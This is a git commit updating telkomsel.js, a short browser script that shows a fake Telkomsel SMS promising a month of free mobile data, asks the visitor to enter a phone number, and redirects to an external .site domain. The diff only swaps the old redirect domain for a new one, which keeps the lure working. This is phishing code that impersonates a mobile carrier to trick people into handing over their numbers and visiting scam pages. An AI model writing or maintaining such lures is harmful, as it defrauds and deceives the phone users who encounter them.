a628790d809c41a75bebbb0c40369f33e843e3ee
usorondo9 <strums-poised.2e@icloud.com>
2026-02-15 09:08:48 +0100

    Update telkomsel.js

--- telkomsel.js
+++ telkomsel.js
@@ -2,5 +2,5 @@
 var password = 'DARA GRATIS 1 BULAN'
 password=prompt('SMS: Selamat, Nomor Telkomsel Anda berhak menerima Data Gratis 1 Bulan, klik OK untuk Memasukkan Nomor Ponsel Anda','DARA GRATIS 1 BULAN');
 if (password != 'DARA GRATIS 1 BULAN') {
-location.href='https://www.craynrp.site/telkomsel';
+location.href='https://www.afiaiba.site/telkomsel';
 }
